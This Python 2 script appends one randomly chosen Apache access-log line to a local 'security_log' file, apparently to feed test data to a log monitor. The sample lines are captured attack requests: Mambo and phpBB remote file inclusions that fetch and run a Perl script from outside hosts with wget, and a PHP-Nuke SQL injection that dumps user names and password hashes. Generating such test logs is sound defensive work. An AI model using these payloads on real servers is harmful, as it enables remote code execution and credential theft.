#!/usr/bin/env python
# -*- encoding: utf-8 -*- 

import random 

def main():

	lines = [
		# Mambo attacks and their patterns in the apache access log file
		'193.91.75.11 - - [18/Aug/2006:13:23:13 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"',
		'212.227.132.51 - - [18/Aug/2006:05:24:07 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.openkid.co.kr/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.openkid.co.kr/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"',
		'201.226.254.210 - - [18/Aug/2006:13:47:46 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"',
		'212.227.132.51 - - [18/Aug/2006:13:56:29 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"',
		'62.103.159.21 - - [18/Aug/2006:13:58:02 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"',

		# PHPBB attacks and their patterns in the apache access log file.
		'207.36.232.148 - - [28/Aug/2006:07:08:46 -0300] "GET /index.php/Artigos/modules/Forums/admin/admin_users.php?phpbb_root_path=http://paupal.info/folder/cmd1.gif?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14611 "-" "Mozilla/5.0"',
		'193.255.143.5 - - [28/Aug/2006:07:52:45 -0300] "GET /index.php/modules/Forums/admin/admin_users.php?phpbb_root_path=http://virtual.uarg.unpa.edu.ar/myftp/list.txt?&cmd=cd%20/tmp/;wget%20http://paupal.info/folder/mambo1.txt;perl%20mambo1.txt;rm%20-rf%20mambo1.*? HTTP/1.0" 200 14527 "-" "Mozilla/5.0"',

		# SQL injection attempt on PHP Nuke
		'200.96.104.241 - - [12/Sep/2006:09:44:28 -0300] "GET /modules.php?name=Downloads&d_op=modifydownloadrequest&%20lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,%20user_email,user_level,0,0%20FROM%20nuke_users HTTP/1.1" 200 9918 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"',
	]
	
	line  = random.choice(lines)

	print "[*] Adding line to file"
	with open("security_log", "a+") as f:
		f.write(line.strip() + "\n")

	print "[*] Added"


if __name__ == "__main__":
	main()